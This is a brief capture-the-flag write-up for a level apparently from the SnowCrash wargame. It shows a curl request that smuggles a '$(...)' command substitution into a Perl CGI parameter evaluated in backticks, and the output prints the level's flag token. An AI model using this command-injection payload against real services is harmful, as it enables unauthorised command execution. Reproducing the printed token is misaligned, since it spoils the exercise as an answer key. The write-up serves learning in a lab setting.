# level04

We have a script `perl` in home. It listen a CGI request on the port `4747`. A parameter `x` is get.  
We can use it to obtain what we want because a [`backtricks`](https://perldoc.perl.org/perlop#Quote-Like-Operators) are used.
This `backtricks` are system command interpreters.
Because we want to send `/bin/getflag` command, we must use this syntax: 

```bash
curl --get http://192.168.56.116:4747 --data 'x="$(/bin/getflag)"'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
Whithout our `$(...)` the code will execute the `echo` command:

```bash
level04@SnowCrash:~$ curl --get http://192.168.56.116:4747 --data 'x="/bin/getflag"'
/bin/getflag
```
